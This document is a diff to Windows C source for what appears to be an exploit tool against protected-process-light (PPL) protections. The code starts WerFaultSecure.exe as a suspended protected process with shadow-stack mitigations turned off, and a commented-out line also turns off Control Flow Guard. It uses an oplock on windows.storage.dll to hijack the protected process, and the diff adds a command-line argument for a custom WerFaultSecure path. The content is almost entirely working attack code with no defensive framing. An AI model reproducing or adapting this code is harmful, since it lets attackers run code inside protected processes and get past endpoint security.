@@ -9,18 +9,18 @@
 
 #pragma warning( disable : 6387)
 
-static LPPROC_THREAD_ATTRIBUTE_LIST CreateMitigationPolicyProcAttribute(DWORD64 mitigation)
+static LPPROC_THREAD_ATTRIBUTE_LIST CreatePolicyProcAttribute(DWORD64 mitigation, BOOL protect, DWORD plevel)
 {
     SIZE_T ptsize = 0;
     LPPROC_THREAD_ATTRIBUTE_LIST ptal;
 
-    InitializeProcThreadAttributeList(NULL, 1, 0, &ptsize);
+    InitializeProcThreadAttributeList(NULL, 2, 0, &ptsize);
     ptal = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, ptsize);
     if (!ptal)
     {
         return NULL;
     }
-    if (!InitializeProcThreadAttributeList(ptal, 1, 0, &ptsize))
+    if (!InitializeProcThreadAttributeList(ptal, 2, 0, &ptsize))
     {
         return NULL;
     }
@@ -28,10 +28,17 @@ static LPPROC_THREAD_ATTRIBUTE_LIST CreateMitigationPolicyProcAttribute(DWORD64 
     {
         return NULL;
     }
+    if (protect)
+    {
+        if (!UpdateProcThreadAttribute(ptal, 0, PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, &plevel, sizeof(DWORD), NULL, NULL))
+        {
+            return NULL;
+        }
+    }
     return ptal;
 }
 
-static void DestroyMitigationPolicyProcAttribute(LPPROC_THREAD_ATTRIBUTE_LIST ptal)
+static void DestroyPolicyProcAttribute(LPPROC_THREAD_ATTRIBUTE_LIST ptal)
 {
     DeleteProcThreadAttributeList(ptal);
     HeapFree(GetProcessHeap(), 0, ptal);
@@ -51,8 +58,8 @@ static BOOL CreateProtectedProcessSuspended(WCHAR* cmdline, PROCESS_INFORMATION*
     memset(&si, 0, sizeof(si));
     si.StartupInfo.cb = sizeof(si);
     si.StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK;
-    si.lpAttributeList = CreateMitigationPolicyProcAttribute(PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_OFF);
-    // | PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF | PROCESS_CREATION_MITIGATION_POLICY2_STRICT_CONTROL_FLOW_GUARD_ALWAYS_OFF
+    si.lpAttributeList = CreatePolicyProcAttribute(PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_OFF, TRUE, 5);
+    //si.lpAttributeList = CreatePolicyProcAttribute(PROCESS_CREATION_MITIGATION_POLICY2_CET_USER_SHADOW_STACKS_ALWAYS_OFF | PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF | PROCESS_CREATION_MITIGATION_POLICY2_STRICT_CONTROL_FLOW_GUARD_ALWAYS_OFF, TRUE, 5);
 
     if (!si.lpAttributeList)
     {
@@ -60,7 +67,7 @@ static BOOL CreateProtectedProcessSuspended(WCHAR* cmdline, PROCESS_INFORMATION*
     }
 
     retval = CreateProcessW(NULL, cmdline, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_PROTECTED_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFOW*)&si, pi);
-    DestroyMitigationPolicyProcAttribute(si.lpAttributeList);
+    DestroyPolicyProcAttribute(si.lpAttributeList);
     return retval;
 }
 
@@ -282,7 +289,7 @@ static BOOL CreatePPLwindowProcess(WCHAR* cmdline, const WCHAR* window_class, co
     return TRUE;
 }
 
-static BOOL PPLwindowWerFaultSecure(WCHAR* werfaultsecure_args, DWORD oplock_timeout, PPPLWINDOW_PROCESS_INFORMATION pplwindow_pi)
+static BOOL PPLwindowWerFaultSecure(WCHAR* custom_werfault_path, WCHAR* werfaultsecure_args, DWORD oplock_timeout, PPPLWINDOW_PROCESS_INFORMATION pplwindow_pi)
 {
     WCHAR lock_dll[100] = { 0 };
     WCHAR cmdline[MAX_PATH] = { 0 };
@@ -307,6 +314,14 @@ static BOOL PPLwindowWerFaultSecure(WCHAR* werfaultsecure_args, DWORD oplock_tim
     lstrcpyW(&cmdline[1], lock_dll);
     lstrcatW(cmdline, L"WerFaultSecure.exe\"");
     lstrcatW(lock_dll, L"windows.storage.dll");
+    if (custom_werfault_path)
+    {
+        if (lstrlenW(custom_werfault_path) > 100)
+        {
+            return FALSE;
+        }
+        lstrcpyW(cmdline, custom_werfault_path);
+    }
     if (werfaultsecure_args)
     {
         lstrcatW(cmdline, L" ");
@@ -548,6 +563,7 @@ int wmain(int argc, WCHAR** argv)
     WCHAR werfaultsecure_args[140];
     unsigned int handle_value = 0;
     PPLWINDOW_PROCESS_INFORMATION pplwindow_pi = { 0 };
+    WCHAR* custom_werfault_path = NULL;
 
     sa.nLength = sizeof(sa);
     sa.lpSecurityDescriptor = NULL;
@@ -562,8 +578,14 @@ int wmain(int argc, WCHAR** argv)
         handle_value = 12; // random value
     }
     
+    custom_werfault_path = NULL;
+    if (argc > 1)
+    {
+        custom_werfault_path = argv[1];
+    }
+
     wsprintfW(werfaultsecure_args, L"-u -p %u -s %u", (unsigned int)GetCurrentProcessId(), handle_value);
-    if (!PPLwindowWerFaultSecure(werfaultsecure_args, 3000, &pplwindow_pi))
+    if (!PPLwindowWerFaultSecure(custom_werfault_path, werfaultsecure_args, 3000, &pplwindow_pi))
     {
         return 1;
     }
